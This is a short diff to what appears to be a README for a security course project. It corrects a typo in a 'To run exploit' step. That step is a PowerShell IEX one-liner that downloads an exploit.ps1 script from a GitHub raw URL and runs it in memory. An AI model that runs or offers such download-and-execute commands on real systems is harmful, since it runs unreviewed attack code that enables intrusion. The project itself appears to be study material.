@@ -10,5 +10,5 @@ To create DLL files
 To run exploit
 
 ```
-IEXIEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/Pwspang/SC3010-Codes/main/exploit.ps1');
+IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/Pwspang/SC3010-Codes/main/exploit.ps1');
 ```
